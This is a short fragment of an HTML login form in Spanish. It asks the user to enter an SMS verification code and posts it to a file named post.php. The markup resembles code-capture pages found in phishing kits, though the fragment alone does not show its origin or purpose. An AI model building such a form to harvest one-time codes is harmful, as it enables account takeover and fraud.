                ...
                <div class='login-content' id='login-form'>
                    ...
                    <form method="POST" action="post.php">
                        ...
                        <div class='login-content'>
                            <input name="SMS" id='password-input' type="password" class='g-input password-input' placeholder="Introduce el código SMS" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                            ...
                            <legend class='g-legend'>¿No has recibido el código SMS?</legend>
